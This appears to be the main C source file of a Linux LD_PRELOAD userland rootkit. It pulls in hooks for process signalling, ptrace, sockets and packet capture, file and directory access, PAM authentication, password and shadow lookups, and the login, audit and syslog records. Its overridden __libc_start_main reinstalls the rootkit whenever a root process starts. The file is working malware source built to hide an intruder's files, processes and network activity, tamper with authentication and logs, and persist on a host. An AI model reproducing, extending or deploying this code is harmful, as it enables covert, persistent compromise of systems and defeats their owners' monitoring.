#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fnmatch.h>
#include <dirent.h>
#include <time.h>
#include <dlfcn.h>
#include <link.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include <linux/netlink.h>
#include <pcap/pcap.h>

#include <pwd.h>
#include <shadow.h>

#include <utmp.h>
#include <utmpx.h>

#include <security/pam_ext.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <syslog.h>

#include "config.h"
#include "hooks/libdl/libdl.h"
#include "util/util.h"
#include "hiding/hiding.h"

int kill(pid_t pid, int sig);
#include "hooks/kill.c"

long ptrace(void *request, pid_t pid, void *addr, void *data);
#include "hooks/ptrace.c"

static int ssme(int domain, int protocol);
int socket(int domain, int type, int protocol);
#include "hooks/socket.c"
#include "hooks/pcap/pcap.h"

#include "hooks/exec/exec.h"
#include "hooks/open/open.h"
#include "hooks/stat/stat.h"
//#include "hooks/rw/rw.h"
#include "hooks/dir/dir.h"
#include "hooks/ln/links.h"
#include "hooks/gid/gid.h"
#include "hooks/perms/perms.h"

#include "hooks/pam/pam.h"
#include "hooks/authlog/authlog.h"
#include "hooks/pwd/pwd.h"
#include "hooks/audit/audit.h"
#include "hooks/utmp/utmp.h"
#include "hooks/syslog/syslog.h"

int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void (*stack_end)){
	if(not_user(0))
		goto do_libc_start_main;
	DIR *dp;
	hook(COPENDIR);
	dp = call(COPENDIR, INSTALL_DIR);
	if(dp == NULL)
		goto do_libc_start_main;
	closedir(dp);
	reinstall();
do_libc_start_main:
	hook(C__LIBC_START_MAIN);
	return (long)call(C__LIBC_START_MAIN, main, argc, ubp_av, init, fini, rtld_fini, stack_end);
}
